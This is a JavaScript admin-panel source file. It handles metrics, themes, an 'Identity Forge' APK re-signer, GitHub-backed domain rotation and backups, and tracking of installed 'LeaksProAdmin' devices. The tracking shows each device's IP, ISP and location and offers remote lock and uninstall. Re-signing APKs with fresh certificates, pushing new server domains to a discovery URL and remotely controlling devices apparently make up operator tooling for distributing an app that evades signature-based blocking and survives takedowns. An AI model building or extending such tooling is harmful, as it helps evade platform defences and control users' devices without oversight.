  ctx.beginPath();
  data.forEach((v, i) => { const x = i * step, y = h - (v / max) * (h - 4); i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y); });
  ctx.strokeStyle = color;
  ctx.lineWidth = 2;
  ctx.stroke();

  // Last point dot
  const lastX = (data.length - 1) * step, lastY = h - (data[data.length - 1] / max) * (h - 4);
  ctx.beginPath(); ctx.arc(lastX, lastY, 3, 0, Math.PI * 2); ctx.fillStyle = color; ctx.fill();

  // Value label
  ctx.fillStyle = color; ctx.font = '10px JetBrains Mono, monospace';
  ctx.fillText(data[data.length - 1], lastX - 20, lastY - 6);
}

// Attach click handlers to metric cells
document.addEventListener('DOMContentLoaded', () => {
  const map = { metricNet: 'net', metricWs: 'ws', metricPing: 'ping', metricSrv: 'srv', metricStreams: 'streams', metricErrors: 'errors' };
  Object.entries(map).forEach(([id, type]) => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('click', () => openMetricsDetail(type));
  });
});

// Hook into WebSocket connection to start metrics after socket is ready
const _origConnectWS = connectWebSocket;
connectWebSocket = function () {
  _origConnectWS();
  // Give socket a moment to connect, then init metrics
  setTimeout(() => MetricsEngine.init(), 500);
};

// ========== Admin App Theme ==========
const themeColors = {
  Sage: '#7BA876', Ocean: '#4A90D9', Lavender: '#9B7ED8',
  Sunset: '#E07B39', Rose: '#D4638F', Slate: '#6B7B8D'
};

async function loadCurrentTheme() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-theme`, {
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    const names = ['Sage', 'Ocean', 'Lavender', 'Sunset', 'Rose', 'Slate'];
    const name = names[data.themeIndex] || 'Sage';
    const badge = document.getElementById('currentThemeBadge');
    if (badge) {
      badge.textContent = name.toUpperCase();
      badge.style.background = themeColors[name] || themeColors.Sage;
    }
  } catch (_) {}
}

async function randomizeAdminTheme() {
  const btn = document.getElementById('randomizeThemeBtn');
  if (btn) btn.disabled = true;
  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-theme`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ randomize: true })
    });
    const data = await res.json();
    if (data.success) {
      const badge = document.getElementById('currentThemeBadge');
      if (badge) {
        badge.textContent = data.themeName.toUpperCase();
        badge.style.background = themeColors[data.themeName] || themeColors.Sage;
      }
      showToast(`Theme changed to ${data.themeName}! App will update on next launch.`, 'success');
    } else {
      showToast('Failed to change theme', 'error');
    }
  } catch (err) {
    showToast('Theme change failed: ' + err.message, 'error');
  } finally {
    if (btn) btn.disabled = false;
  }
}

// Load theme badge when settings page is shown
const _origShowPage = typeof showPage === 'function' ? showPage : null;
document.addEventListener('DOMContentLoaded', () => {
  // Also load on initial page if settings
  setTimeout(() => loadCurrentTheme(), 1000);
});

// ═══════════════════════════════════════════════════════════════
//  APK SIGNER — Identity Forge
// ═══════════════════════════════════════════════════════════════
let apkSignFile = null;
let apkSignProcessing = false;

function initApkSignPage() {
  loadSignedApks();
  setupApkSignDropZone();
  // Listen for live signing logs via WebSocket
  if (socket && !socket._apkLogBound) {
    socket.on('apk_sign_log', handleApkSignLog);
    socket._apkLogBound = true;
  }
}

function setupApkSignDropZone() {
  const dz = document.getElementById('apkSignDropZone');
  const fi = document.getElementById('apkSignFileInput');
  if (!dz || !fi) return;
  // Remove old listeners by cloning
  const newDz = dz.cloneNode(true);
  dz.parentNode.replaceChild(newDz, dz);
  const newFi = document.getElementById('apkSignFileInput');

  newDz.addEventListener('click', () => newFi.click());
  newDz.addEventListener('dragover', e => { e.preventDefault(); newDz.classList.add('dragover'); });
  newDz.addEventListener('dragleave', () => newDz.classList.remove('dragover'));
  newDz.addEventListener('drop', e => {
    e.preventDefault();
    newDz.classList.remove('dragover');
    if (e.dataTransfer.files.length > 0) handleApkFileSelect(e.dataTransfer.files[0]);
  });
  newFi.addEventListener('change', e => {
    if (e.target.files.length > 0) handleApkFileSelect(e.target.files[0]);
  });
}

function handleApkFileSelect(file) {
  if (!file.name.toLowerCase().endsWith('.apk')) {
    showToast('Only .apk files are allowed', 'error');
    return;
  }
  apkSignFile = file;
  document.getElementById('apkSignDropZone').classList.add('hidden');
  const preview = document.getElementById('apkFilePreview');
  preview.classList.remove('hidden');
  document.getElementById('apkFileName').textContent = file.name;
  document.getElementById('apkFileSize').textContent = fmtBytes(file.size);
  document.getElementById('apkRemarkInput').value = '';

  // Remove button handler
  document.getElementById('apkFileRemove').onclick = () => {
    apkSignFile = null;
    preview.classList.add('hidden');
    document.getElementById('apkSignDropZone').classList.remove('hidden');
    document.getElementById('apkSignFileInput').value = '';
  };
}

async function signApk() {
  if (!apkSignFile || apkSignProcessing) return;
  apkSignProcessing = true;

  const btn = document.getElementById('apkSignBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i> Signing...';

  // Show terminal
  const logCard = document.getElementById('apkLogCard');
  logCard.style.display = '';
  const terminal = document.getElementById('apkTerminalLines');
  terminal.innerHTML = '';
  document.getElementById('apkLogStatus').textContent = 'PROCESSING';
  document.getElementById('apkLogStatus').className = 'apk-log-status';

  // Add initial log
  appendApkLog('INIT', 'Uploading APK to signing server...', 'info');

  const formData = new FormData();
  formData.append('apk', apkSignFile);
  formData.append('remark', document.getElementById('apkRemarkInput').value || '');

  try {
    const res = await fetch(`${API_BASE}/api/admin/sign-apk`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword },
      body: formData
    });
    const data = await res.json();
    if (data.success) {
      document.getElementById('apkLogStatus').textContent = 'COMPLETE';
      document.getElementById('apkLogStatus').className = 'apk-log-status done';
      appendApkLog('DONE', `APK signed successfully — ${fmtBytes(data.signed_size)}`, 'success');
      showToast('APK signed successfully!', 'success');
      // Reset upload form
      apkSignFile = null;
      document.getElementById('apkFilePreview').classList.add('hidden');
      document.getElementById('apkSignDropZone').classList.remove('hidden');
      document.getElementById('apkSignFileInput').value = '';
      // Refresh vault
      loadSignedApks();
    } else {
      document.getElementById('apkLogStatus').textContent = 'FAILED';
      document.getElementById('apkLogStatus').className = 'apk-log-status failed';
      appendApkLog('FAIL', data.error || 'Unknown error', 'error');
      showToast('Signing failed: ' + (data.error || 'Unknown'), 'error');
    }
  } catch (err) {
    document.getElementById('apkLogStatus').textContent = 'FAILED';
    document.getElementById('apkLogStatus').className = 'apk-log-status failed';
    appendApkLog('FAIL', err.message, 'error');
    showToast('Signing failed: ' + err.message, 'error');
  } finally {
    apkSignProcessing = false;
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-shield-check-line"></i> Sign APK';
  }
}

function handleApkSignLog(data) {
  // Only show if on APK sign page or the terminal card is visible
  const logCard = document.getElementById('apkLogCard');
  if (logCard) {
    logCard.style.display = '';
    appendApkLog(data.step, data.detail, data.level);
    // Auto-scroll
    const terminal = document.getElementById('apkTerminal');
    if (terminal) terminal.scrollTop = terminal.scrollHeight;
  }
}

function appendApkLog(step, detail, level) {
  const container = document.getElementById('apkTerminalLines');
  if (!container) return;
  const now = new Date();
  const ts = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
  const isPhase = step === 'PHASE';
  const line = document.createElement('div');
  line.className = 'apk-log-line' + (isPhase ? ' phase-line' : '');
  line.innerHTML = `
    <span class="apk-log-ts">${ts}</span>
    <span class="apk-log-step ${isPhase ? 'phase' : level}">${isPhase ? '' : '[' + esc(step) + ']'}</span>
    <span class="apk-log-detail${isPhase ? ' phase-detail' : ''}">${esc(detail)}</span>
  `;
  container.appendChild(line);
  // Scroll
  const terminal = document.getElementById('apkTerminal');
  if (terminal) terminal.scrollTop = terminal.scrollHeight;
}

async function loadSignedApks() {
  try {
    const [apkRes, deployRes] = await Promise.all([
      fetch(`${API_BASE}/api/admin/signed-apks`, { headers: { 'x-admin-password': adminPassword } }),
      fetch(`${API_BASE}/api/admin/deployed-apk-id`, { headers: { 'x-admin-password': adminPassword } })
    ]);
    const apkData = await apkRes.json();
    const deployData = await deployRes.json();
    renderSignedApks(apkData.apks || [], deployData.deployed_id || null);
  } catch (err) {
    console.error('Failed to load signed APKs:', err);
  }
}

function renderSignedApks(apks, deployedId) {
  const container = document.getElementById('apkVaultList');
  const countEl = document.getElementById('apkVaultCount');
  const emptyEl = document.getElementById('apkVaultEmpty');

  if (!container) return;
  countEl.textContent = apks.length;

  if (apks.length === 0) {
    container.innerHTML = '';
    container.appendChild(emptyEl || createApkVaultEmpty());
    return;
  }

  container.innerHTML = apks.map(apk => {
    const statusClass = apk.status || 'pending';
    const signed = apk.last_signed_at ? new Date(apk.last_signed_at) : null;
    const created = apk.created_at ? new Date(apk.created_at) : null;
    const signedStr = signed ? fmtDate(signed) : '—';
    const createdStr = created ? fmtDate(created) : '—';
    const certShort = apk.cert_hash ? apk.cert_hash.substring(0, 24) + '...' : '—';
    const remarkDisplay = apk.remark ? esc(apk.remark) : '<i style="color:var(--text3)">Click to add remark</i>';
    const isReady = statusClass === 'ready';
    const isDeployed = deployedId === apk.id;

    return `
      <div class="apk-vault-item ${isDeployed ? 'deployed' : ''}" data-id="${apk.id}">
        <div class="apk-vault-icon ${statusClass}">
          <i class="${isDeployed ? 'ri-rocket-2-fill' : 'ri-android-fill'}"></i>
        </div>
        <div class="apk-vault-body">
          <div class="apk-vault-name">
            ${esc(apk.original_name)}
            ${isDeployed ? '<span class="deployed-badge">LIVE</span>' : ''}
          </div>
          <div class="apk-vault-remark" onclick="editApkRemark('${apk.id}', this)" title="Click to edit remark">${remarkDisplay}</div>
          <div class="apk-vault-meta">
            <span><i class="ri-calendar-line"></i>${createdStr}</span>
            <span><i class="ri-file-zip-line"></i>${fmtBytes(apk.original_size || 0)} → ${fmtBytes(apk.signed_size || 0)}</span>
            <span><i class="ri-refresh-line"></i>Signed ${apk.sign_count || 1}x</span>
            <span class="apk-vault-status ${statusClass}">${statusClass.toUpperCase()}</span>
          </div>
          <div class="apk-vault-cert">
            <i class="ri-key-2-line"></i>
            ${apk.cert_cn ? `CN=${esc(apk.cert_cn)}` : ''} ${apk.cert_org ? `O=${esc(apk.cert_org)}` : ''}
            ${apk.cert_hash ? `| SHA: ${esc(certShort)}` : ''}
          </div>
          <div class="apk-vault-meta" style="margin-top:4px;">
            <span><i class="ri-time-line"></i>Last signed: ${signedStr}</span>
          </div>
        </div>
        <div class="apk-vault-actions">
          <button class="apk-vault-btn ${isDeployed ? 'deployed' : 'deploy'}" onclick="deploySignedApk('${apk.id}')" ${!isReady ? 'disabled' : ''} title="${isDeployed ? 'Currently deployed' : 'Deploy as active download'}">
            <i class="${isDeployed ? 'ri-check-double-line' : 'ri-upload-cloud-2-line'}"></i>${isDeployed ? 'LIVE' : 'DEPLOY'}
          </button>
          <button class="apk-vault-btn download" onclick="downloadSignedApk('${apk.id}')" ${!isReady ? 'disabled' : ''} title="Download signed APK">
            <i class="ri-download-line"></i>GET
          </button>
          <button class="apk-vault-btn resign" onclick="resignSignedApk('${apk.id}')" ${apk.status === 'signing' ? 'disabled' : ''} title="Re-sign with fresh identity">
            <i class="ri-refresh-line"></i>RE-SIGN
          </button>
          <button class="apk-vault-btn delete" onclick="deleteSignedApk('${apk.id}', '${esc(apk.original_name)}')" title="Delete permanently">
            <i class="ri-delete-bin-line"></i>
          </button>
        </div>
      </div>
    `;
  }).join('');
}

function createApkVaultEmpty() {
  const div = document.createElement('div');
  div.className = 'apk-vault-empty';
  div.id = 'apkVaultEmpty';
  div.innerHTML = `
    <i class="ri-inbox-unarchive-line"></i>
    <p>No signed APKs yet</p>
    <span>Upload an APK above to get started</span>
  `;
  return div;
}

function downloadSignedApk(id) {
  window.open(`${API_BASE}/api/admin/download-signed-apk/${id}`, '_blank');
}

async function deploySignedApk(id) {
  if (!confirm('Deploy this APK as the active download? Users and the landing page will receive this APK.')) return;
  try {
    const res = await fetch(`${API_BASE}/api/admin/deploy-signed-apk/${id}`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast('APK deployed as active download!', 'success');
      loadSignedApks();
    } else {
      showToast('Deploy failed: ' + (data.error || 'Unknown'), 'error');
    }
  } catch (err) {
    showToast('Deploy failed: ' + err.message, 'error');
  }
}

async function resignSignedApk(id) {
  if (!confirm('Re-sign this APK with a fresh new certificate? This will generate a new identity for it.')) return;

  // Show terminal
  const logCard = document.getElementById('apkLogCard');
  logCard.style.display = '';
  const terminal = document.getElementById('apkTerminalLines');
  terminal.innerHTML = '';
  document.getElementById('apkLogStatus').textContent = 'RE-SIGNING';
  document.getElementById('apkLogStatus').className = 'apk-log-status';

  appendApkLog('INIT', `Starting re-sign for APK ${id.substring(0, 8)}...`, 'info');

  try {
    const res = await fetch(`${API_BASE}/api/admin/resign-apk/${id}`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      document.getElementById('apkLogStatus').textContent = 'COMPLETE';
      document.getElementById('apkLogStatus').className = 'apk-log-status done';
      appendApkLog('DONE', `Re-signed successfully — new identity active`, 'success');
      showToast('APK re-signed with fresh identity!', 'success');
      loadSignedApks();
    } else {
      document.getElementById('apkLogStatus').textContent = 'FAILED';
      document.getElementById('apkLogStatus').className = 'apk-log-status failed';
      appendApkLog('FAIL', data.error || 'Unknown error', 'error');
      showToast('Re-sign failed: ' + (data.error || 'Unknown'), 'error');
    }
  } catch (err) {
    document.getElementById('apkLogStatus').textContent = 'FAILED';
    document.getElementById('apkLogStatus').className = 'apk-log-status failed';
    appendApkLog('FAIL', err.message, 'error');
    showToast('Re-sign failed: ' + err.message, 'error');
  }
}

async function deleteSignedApk(id, name) {
  if (!confirm(`Delete "${name}" permanently? This removes both the original and signed APK files.`)) return;
  try {
    const res = await fetch(`${API_BASE}/api/admin/signed-apks/${id}`, {
      method: 'DELETE',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast('APK deleted', 'success');
      loadSignedApks();
    } else {
      showToast('Delete failed: ' + (data.error || 'Unknown'), 'error');
    }
  } catch (err) {
    showToast('Delete failed: ' + err.message, 'error');
  }
}

async function editApkRemark(id, el) {
  const current = el.textContent.trim();
  const newRemark = prompt('Enter remark/label for this APK:', current === 'Click to add remark' ? '' : current);
  if (newRemark === null) return; // Cancelled
  try {
    const res = await fetch(`${API_BASE}/api/admin/signed-apks/${id}/remark`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-password': adminPassword
      },
      body: JSON.stringify({ remark: newRemark })
    });
    const data = await res.json();
    if (data.success) {
      el.innerHTML = newRemark ? esc(newRemark) : '<i style="color:var(--text3)">Click to add remark</i>';
      showToast('Remark updated', 'success');
    }
  } catch (err) {
    showToast('Failed to update remark', 'error');
  }
}

// ═══════════════════════════════════════
//  System & Recovery Management
// ═══════════════════════════════════════

let _sysAutoBackupEnabled = false;

async function loadSystemConfig() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config`, {
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();

    document.getElementById('sysCurrentOrigin').textContent = data.current_origin || '—';
    document.getElementById('sysActiveDomain').textContent = data.server_domain || '(not set — using current origin)';
    document.getElementById('sysDiscoveryUrl').textContent = data.discovery_url || '—';
    document.getElementById('sysLastDomainPush').textContent = data.last_domain_push ? timeAgo(data.last_domain_push) : 'Never';
    document.getElementById('sysGitHubRepo').textContent = data.github_repo || '—';
    document.getElementById('sysTokenStatus').textContent = data.github_token_set ? '✓ Token configured' : '✗ Not set';
    document.getElementById('sysTokenStatus').style.color = data.github_token_set ? 'var(--green)' : 'var(--red)';
    document.getElementById('sysLastBackup').textContent = data.last_github_backup ? timeAgo(data.last_github_backup) : 'Never';

    _sysAutoBackupEnabled = data.auto_backup_enabled;
    document.getElementById('sysAutoBackupStatus').textContent = data.auto_backup_enabled ? 'Enabled (every 6 hours)' : 'Disabled';
    document.getElementById('sysAutoBackupStatus').style.color = data.auto_backup_enabled ? 'var(--green)' : 'var(--text-muted)';
    document.getElementById('sysAutoBackupLabel').textContent = data.auto_backup_enabled ? 'Disable Auto Backup' : 'Enable Auto Backup';

    if (data.server_domain) {
      document.getElementById('sysDomainInput').placeholder = data.server_domain;
    }
  } catch (err) {
    console.error('Failed to load system config:', err);
  }
}

async function updateDomain() {
  const input = document.getElementById('sysDomainInput');
  const domain = input.value.trim();
  if (!domain) {
    showToast('Enter a domain URL', 'error');
    return;
  }

  const btn = document.getElementById('sysDomainBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Updating...';

  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config/domain`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ domain })
    });
    const data = await res.json();
    if (data.success) {
      showToast(data.message, data.github_pushed ? 'success' : 'warning');
      input.value = '';
      loadSystemConfig();
    } else {
      showToast(data.error || 'Failed', 'error');
    }
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-refresh-line"></i> Update Domain';
  }
}

async function saveGitHubToken() {
  const input = document.getElementById('sysGitHubToken');
  const token = input.value.trim();
  if (!token) {
    showToast('Enter a GitHub token', 'error');
    return;
  }

  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config/github-token`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ token })
    });
    const data = await res.json();
    if (data.success) {
      showToast('GitHub token saved!', 'success');
      input.value = '';
      loadSystemConfig();
    } else {
      showToast(data.error || 'Failed', 'error');
    }
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

async function createBackup() {
  const btn = document.getElementById('sysBackupBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Backing up...';

  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config/backup`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      const details = Object.entries(data.tables).map(([t, c]) => `${t}: ${c}`).join(', ');
      showToast(`Backup complete! ${data.total_rows} rows (${(data.backup_size/1024).toFixed(1)} KB)${data.github_pushed ? ' — pushed to GitHub' : ''}`, data.github_pushed ? 'success' : 'warning');
      loadSystemConfig();
    } else {
      showToast(data.error || 'Backup failed', 'error');
    }
  } catch (err) {
    showToast('Backup failed: ' + err.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-upload-cloud-2-line"></i> Backup Now';
  }
}

async function restoreBackup() {
  if (!confirm('⚠️ RESTORE FROM GITHUB BACKUP?\n\nThis will overwrite current data with the last backup. Only use this when setting up a new server.\n\nContinue?')) return;

  const btn = document.getElementById('sysRestoreBtn');
  btn.disabled = true;
  btn.innerHTML = '<i class="ri-loader-4-line spin"></i> Restoring...';

  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config/restore`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast(`Restored ${data.total_restored} rows from backup (${data.backup_date})`, 'success');
      loadSystemConfig();
    } else {
      showToast(data.error || 'Restore failed', 'error');
    }
  } catch (err) {
    showToast('Restore failed: ' + err.message, 'error');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="ri-download-cloud-2-line"></i> Restore from GitHub';
  }
}

async function toggleAutoBackup() {
  const newState = !_sysAutoBackupEnabled;

  try {
    const res = await fetch(`${API_BASE}/api/admin/system-config/auto-backup`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPassword },
      body: JSON.stringify({ enabled: newState })
    });
    const data = await res.json();
    if (data.success) {
      showToast(`Auto backup ${newState ? 'enabled' : 'disabled'}`, 'success');
      loadSystemConfig();
    } else {
      showToast(data.error || 'Failed', 'error');
    }
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

// ═══════════════════════════════════════
//  Admin Devices Management
// ═══════════════════════════════════════

async function loadAdminDevices() {
  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-devices`, {
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    renderAdminDevices(data.devices || [], data.total, data.online, data.offline);
  } catch (err) {
    console.error('Failed to load admin devices:', err);
  }
}

function renderAdminDevices(devices, total, online, offline) {
  document.getElementById('admDevTotal').textContent = total || 0;
  document.getElementById('admDevOnline').textContent = online || 0;
  document.getElementById('admDevOffline').textContent = offline || 0;
  document.getElementById('admDevLocked').textContent = devices.filter(d => d.is_locked === 1).length;

  const grid = document.getElementById('adminDeviceGrid');
  if (!grid) return;

  if (devices.length === 0) {
    grid.innerHTML = `
      <div class="fx-empty">
        <i class="ri-smartphone-line"></i>
        <p>NO ADMIN APP INSTALLATIONS DETECTED</p>
        <span>Devices will appear when LeaksProAdmin app registers</span>
      </div>
    `;
    return;
  }

  grid.innerHTML = devices.map(d => {
    const isOnline = d.is_online === 1;
    const isLocked = d.is_locked === 1;
    const lastSeen = d.last_seen ? timeAgo(d.last_seen) : 'Never';
    const firstSeen = d.first_seen ? new Date(d.first_seen + 'Z').toLocaleDateString() : '—';
    const deviceName = [d.manufacturer, d.model].filter(Boolean).join(' ') || d.device_name || 'Unknown Device';
    const location = [d.city, d.country].filter(Boolean).join(', ') || '—';

    return `
      <div class="adm-dev-card ${isOnline ? 'online' : 'offline'} ${isLocked ? 'locked' : ''}">
        <div class="adm-dev-top">
          <div class="adm-dev-status ${isOnline ? 'online' : 'offline'}">
            <span class="adm-dev-dot"></span>
            ${isOnline ? 'ONLINE' : 'OFFLINE'}
          </div>
          ${isLocked ? '<span class="adm-dev-lock-badge"><i class="ri-lock-2-fill"></i> LOCKED</span>' : ''}
        </div>

        <div class="adm-dev-info">
          <div class="adm-dev-name">
            <i class="ri-smartphone-fill"></i> ${esc(deviceName)}
          </div>
          <div class="adm-dev-meta">
            <div class="adm-dev-row">
              <i class="ri-global-line"></i>
              <span class="adm-dev-label">IP</span>
              <span class="adm-dev-val">${esc(d.ip_address || '—')}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-base-station-line"></i>
              <span class="adm-dev-label">ISP</span>
              <span class="adm-dev-val">${esc(d.isp || '—')}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-map-pin-line"></i>
              <span class="adm-dev-label">Location</span>
              <span class="adm-dev-val">${esc(location)}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-android-line"></i>
              <span class="adm-dev-label">Android</span>
              <span class="adm-dev-val">${esc(d.os_version || '—')}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-apps-line"></i>
              <span class="adm-dev-label">Version</span>
              <span class="adm-dev-val">${esc(d.app_version || '—')}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-fingerprint-line"></i>
              <span class="adm-dev-label">Device ID</span>
              <span class="adm-dev-val" style="font-size:10px">${esc(d.device_id?.substring(0, 20) || '—')}…</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-time-line"></i>
              <span class="adm-dev-label">Last Seen</span>
              <span class="adm-dev-val">${lastSeen}</span>
            </div>
            <div class="adm-dev-row">
              <i class="ri-calendar-check-line"></i>
              <span class="adm-dev-label">Installed</span>
              <span class="adm-dev-val">${firstSeen}</span>
            </div>
          </div>
        </div>

        <div class="adm-dev-actions">
          <button class="adm-dev-btn ${isLocked ? 'unlock' : 'lock'}" onclick="toggleAdminDeviceLock('${esc(d.device_id)}', ${isLocked})" title="${isLocked ? 'Unlock this device' : 'Lock this device'}">
            <i class="${isLocked ? 'ri-lock-unlock-line' : 'ri-lock-2-line'}"></i>
            ${isLocked ? 'UNLOCK' : 'LOCK'}
          </button>
          <button class="adm-dev-btn uninstall" onclick="uninstallAdminDevice('${esc(d.device_id)}', '${esc(deviceName)}')" title="Remote uninstall">
            <i class="ri-delete-bin-line"></i>
            UNINSTALL
          </button>
          <button class="adm-dev-btn remove" onclick="removeAdminDevice('${esc(d.device_id)}', '${esc(deviceName)}')" title="Remove from tracking">
            <i class="ri-close-circle-line"></i>
          </button>
        </div>
      </div>
    `;
  }).join('');
}

function timeAgo(dateStr) {
  try {
    const d = new Date(dateStr + (dateStr.endsWith('Z') ? '' : 'Z'));
    const diff = Math.floor((Date.now() - d.getTime()) / 1000);
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return `${Math.floor(diff / 86400)}d ago`;
  } catch (_) { return dateStr; }
}

async function toggleAdminDeviceLock(deviceId, isCurrentlyLocked) {
  const action = isCurrentlyLocked ? 'unlock' : 'lock';
  const msg = isCurrentlyLocked
    ? 'Unlock this device? The app will work normally again.'
    : 'Lock this device? The app will show "Locked by Boss" and stop working.';
  if (!confirm(msg)) return;

  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-device/${encodeURIComponent(deviceId)}/${action}`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast(`Device ${action}ed successfully`, 'success');
      loadAdminDevices();
    } else {
      showToast(data.error || `Failed to ${action}`, 'error');
    }
  } catch (err) {
    showToast(`Failed to ${action}: ${err.message}`, 'error');
  }
}

async function uninstallAdminDevice(deviceId, deviceName) {
  if (!confirm(`Send remote uninstall command to "${deviceName}"?\n\nThe app will prompt the user to uninstall on the next heartbeat.`)) return;

  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-device/${encodeURIComponent(deviceId)}/uninstall`, {
      method: 'POST',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast('Uninstall command sent!', 'success');
      loadAdminDevices();
    } else {
      showToast(data.error || 'Failed to send uninstall command', 'error');
    }
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}

async function removeAdminDevice(deviceId, deviceName) {
  if (!confirm(`Remove "${deviceName}" from tracking? This only removes it from the list.`)) return;

  try {
    const res = await fetch(`${API_BASE}/api/admin/admin-device/${encodeURIComponent(deviceId)}`, {
      method: 'DELETE',
      headers: { 'x-admin-password': adminPassword }
    });
    const data = await res.json();
    if (data.success) {
      showToast('Device removed from tracking', 'success');
      loadAdminDevices();
    } else {
      showToast(data.error || 'Failed to remove', 'error');
    }
  } catch (err) {
    showToast('Failed: ' + err.message, 'error');
  }
}
